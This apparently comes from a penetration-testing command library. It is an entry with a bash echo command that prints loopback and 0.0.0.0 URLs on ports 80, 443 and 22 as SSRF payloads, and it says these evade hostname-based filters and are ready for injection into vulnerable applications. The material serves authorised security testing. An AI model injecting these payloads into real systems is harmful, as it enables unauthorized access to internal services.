---
id: 587ee41f-a53d-4ddb-83a3-0060d6bf6405
name: generate-loopback-urls-for-ssrf
type: command
executor: bash
data: >-
  echo -e
  "http://127.0.0.1:80\nhttp://127.0.0.1:443\nhttp://127.0.0.1:22\nhttp://0.0.0.0:80\nhttp://0.0.0.0:443\nhttp://0.0.0.0:22"
output: null
created_at: '2023-04-06T03:56:37.204744+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
  - macOS
tags:
  - ssrf
  - payload-generation
verified: true
validated: true
---

# generate-loopback-urls-for-ssrf

## Command

```bash
echo -e "http://127.0.0.1:80\nhttp://127.0.0.1:443\nhttp://127.0.0.1:22\nhttp://0.0.0.0:80\nhttp://0.0.0.0:443\nhttp://0.0.0.0:22"
```

## Description

This command outputs SSRF payloads using loopback (127.0.0.1) and all-interfaces (0.0.0.0) IP addresses for common ports. These variants help evade hostname-based filters in SSRF-vulnerable applications.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-e` | Enable interpretation of backslash escapes for newlines | Yes |

## Examples

### Basic Usage

```bash
echo -e "http://127.0.0.1:80\nhttp://127.0.0.1:443\nhttp://127.0.0.1:22\nhttp://0.0.0.0:80\nhttp://0.0.0.0:443\nhttp://0.0.0.0:22"
```

### Advanced Usage with More Ports

```bash
echo -e "http://127.0.0.1:80\nhttp://127.0.0.1:8080\nhttp://127.0.0.1:3306" > custom_payloads.txt
```

## Expected Output

http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:22
http://0.0.0.0:80
http://0.0.0.0:443
http://0.0.0.0:22

A list of IP-based URLs ready for injection into SSRF tests.

## Related

- [[procedures/Craft-Localhost-SSRF-Payloads-for-Internal-Access]]
